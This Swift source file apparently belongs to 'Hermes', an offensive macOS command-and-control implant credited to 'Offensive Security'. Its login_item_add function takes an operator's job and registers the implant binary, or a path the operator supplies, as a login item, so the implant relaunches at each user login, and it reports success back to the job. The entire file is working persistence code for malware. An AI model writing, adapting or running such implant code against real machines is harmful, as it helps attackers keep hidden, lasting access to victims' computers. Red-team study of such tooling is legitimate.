//
//  login_item.swift
//  Hermes
//
//  Created by Offensive Security on 2/29/24.
//

import Foundation

func login_item_add(job: Job) {
    print(job.parameters)
    let loginItemsList: LSSharedFileList = LSSharedFileListCreate(nil, kLSSharedFileListSessionLoginItems.takeRetainedValue(), nil)!.takeRetainedValue()

    //let path = NSURL.fileURL(withPath: Bundle.main.executablePath ?? "") as CFURL
    
    var path: CFURL

    if job.parameters.count == 0 {
        path = NSURL.fileURL(withPath: Bundle.main.executablePath ?? "") as CFURL
    }
    else {
        path = NSURL.fileURL(withPath: job.parameters) as CFURL
    }
   // print(path)
    // Copy all login items in the list
    let loginItems: NSArray = LSSharedFileListCopySnapshot(loginItemsList, nil)!.takeRetainedValue()

    var foundLoginItem: LSSharedFileListItem?
    var nextItemUrl: Unmanaged<CFURL>?

    // Iterate through login items to find one for given path
    //NSLog("App URL: \(path)")
    for index in (0..<loginItems.count)  // CFArrayGetCount(loginItems)
    {

        // swiftlint:disable:next force_cast
        let nextLoginItem: LSSharedFileListItem = loginItems.object(at: index) as! LSSharedFileListItem

        if LSSharedFileListItemResolve(nextLoginItem, 0, &nextItemUrl, nil) == noErr {

            NSLog("Next login item URL: \(nextItemUrl!.takeUnretainedValue())")
            // compare searched item URL passed in argument with next item URL
            if nextItemUrl!.takeRetainedValue() == path {
                foundLoginItem = nextLoginItem
            }
        }
    }

    // add new Login Item at the end of Login Items list
    if let loginItem = LSSharedFileListInsertItemURL(loginItemsList,
                                                     getLastLoginItemInList(loginItemsList: loginItemsList),
                                                     nil, nil,
                                                     path,
                                                     nil, nil) {
        job.result = "Added login item is: \(loginItem)"
        job.completed = true
        job.success = true
    }
    else {
        job.result = "Failed to add login item"
        job.completed = true
        job.success = false
        job.status = "error"
    }
}

func getLastLoginItemInList(loginItemsList: LSSharedFileList) -> LSSharedFileListItem! {

    // Copy all login items in the list
    let loginItems: NSArray = LSSharedFileListCopySnapshot(loginItemsList, nil)!.takeRetainedValue() as NSArray
    if loginItems.count > 0 {
        // swiftlint:disable:next force_cast
        let lastLoginItem = loginItems.lastObject as! LSSharedFileListItem

        //NSLog("Last login item is: \(lastLoginItem)")
        return lastLoginItem
    }

    return kLSSharedFileListItemBeforeFirst.takeRetainedValue()
}
